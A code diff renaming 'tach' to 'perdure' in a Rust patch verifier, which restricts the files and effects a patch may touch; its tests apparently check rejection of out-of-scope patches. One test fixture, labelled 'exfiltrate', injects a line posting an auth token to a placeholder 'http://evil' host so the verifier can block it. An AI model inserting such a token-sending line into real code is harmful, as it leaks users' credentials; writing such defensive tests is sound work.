@@ -106,7 +106,7 @@ pub struct Patch {
     /// Glob patterns the patch is permitted to touch.
     pub touches: Vec<String>,
     pub edits: Vec<Edit>,
-    /// Human-facing proof obligations (e.g. `tach check`, `tach test`).
+    /// Human-facing proof obligations (e.g. `perdure check`, `perdure test`).
     pub prove: Vec<String>,
 }
 
@@ -122,7 +122,7 @@ pub struct VerifyOpts {
     pub forbid_api_break: bool,
     /// When set, a goal's authority surface: a new effect is permitted *only* if
     /// it appears in this set. This is stricter than `allow_new_effects` and is
-    /// how `tach goal run` enforces the `allow { effect ... }` block — a patch
+    /// how `perdure goal run` enforces the `allow { effect ... }` block — a patch
     /// that would perform an effect the goal was never granted is rejected before
     /// it touches disk. `None` means "no goal scope; fall back to
     /// `allow_new_effects`".
@@ -405,8 +405,8 @@ mod tests {
 
     fn ws_with(code: &str, tests: &str) -> Workspace {
         let mut w = Workspace::new();
-        w.insert("src/auth.tach", code);
-        w.insert("tests/auth_test.tach", tests);
+        w.insert("src/auth.pdr", code);
+        w.insert("tests/auth_test.pdr", tests);
         w
     }
 
@@ -433,11 +433,11 @@ test "valid loads" {
 
     #[test]
     fn glob_matches() {
-        assert!(glob_match("src/**", "src/auth.tach"));
-        assert!(glob_match("src/auth.tach", "src/auth.tach"));
-        assert!(glob_match("*", "auth.tach"));
-        assert!(!glob_match("src/*.tach", "src/sub/auth.tach"));
-        assert!(!glob_match("src/auth.tach", "src/billing.tach"));
+        assert!(glob_match("src/**", "src/auth.pdr"));
+        assert!(glob_match("src/auth.pdr", "src/auth.pdr"));
+        assert!(glob_match("*", "auth.pdr"));
+        assert!(!glob_match("src/*.pdr", "src/sub/auth.pdr"));
+        assert!(!glob_match("src/auth.pdr", "src/billing.pdr"));
     }
 
     #[test]
@@ -446,9 +446,9 @@ test "valid loads" {
         let patch = Patch {
             name: "sneaky".into(),
             reason: "touch a file it shouldn't".into(),
-            touches: vec!["src/auth.tach".into()],
+            touches: vec!["src/auth.pdr".into()],
             edits: vec![Edit {
-                file: "tests/auth_test.tach".into(),
+                file: "tests/auth_test.pdr".into(),
                 span: Span::at(0),
                 replacement: "// hi\n".into(),
             }],
@@ -474,7 +474,7 @@ test "valid loads" {
             reason: "exfiltrate".into(),
             touches: vec!["src/**".into()],
             edits: vec![Edit {
-                file: "src/auth.tach".into(),
+                file: "src/auth.pdr".into(),
                 span: Span::at(inject_at),
                 replacement: "net.post(\"http://evil\", token)\n  ".into(),
             }],
